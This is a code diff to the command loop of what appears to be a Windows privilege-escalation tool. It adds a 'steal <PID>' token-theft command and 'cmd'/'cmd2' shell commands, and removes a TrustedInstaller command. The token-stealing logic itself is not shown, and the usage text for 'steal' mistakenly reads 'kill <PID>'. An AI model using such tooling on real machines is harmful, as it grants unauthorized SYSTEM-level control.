@@ -10,7 +10,9 @@ extern void SFGetProcessInformation(char *procname);
 extern void SFLocalPrivilege();
 extern void SFCreateProcess(char *exePath);
 extern void SFRespawn();
-extern void SFGetTrustedInstaller();
+extern void SFGetToken(DWORD pid);
+extern void SFOpenCMD();
+extern void SFOpenCMD2();
 DWORD o_restart = 0;
 void StarFlyLoadEffect(const char *str) {
     int len = 0;
@@ -77,13 +79,22 @@ int main() {
                 }
             } else if (strcmp(input, "getsystem") == 0) {
                 SFLocalPrivilege();
-            } else if (strcmp(input, "getti") == 0) {
-                SFGetTrustedInstaller();
+            } else if (strncmp(input, "steal", 5) == 0) {
+                char *argument = strchr(input, ' ');
+                if (argument != NULL) {
+                    argument++;
+                    DWORD pid = atoi(argument);
+                    if (pid > 0) {
+                        SFGetToken(pid);
+                    } else {
+                        SFPrintError("Invalid PID", "无效的PID");
+                    }
+                } else {
+                    SFPrintError("Usage: kill <PID>", "正确语法: kill <PID>");
+                }
             } else if (strcmp(input, "respawn") == 0) {
                 if (hDupPriToken != 0xcccccccccccccccc) {
                     SFRespawn();
-                } else {
-                    SFPrintError("Enter \"getsystem\" to Obtain a Valid Primary Token", "请先输入\'GetSystem\'获取主令牌");
                 }
             } else if (strncmp(input, "run", 3) == 0){
                 char *argument = strchr(input, ' ');
@@ -93,6 +104,10 @@ int main() {
                 } else {
                     SFPrintError("Missed Argument: Executable Path", "参数缺失: 可执行程序绝对路径");
                 }
+            } else if (strcmp(input, "cmd2") == 0) {
+                SFOpenCMD2();
+            } else if (strcmp(input, "cmd") == 0) {
+                SFOpenCMD();
             } else if (strcmp(input, "lang") == 0) {
                 o_lang++;
             } else if (strcmp(input, "") == 0) {
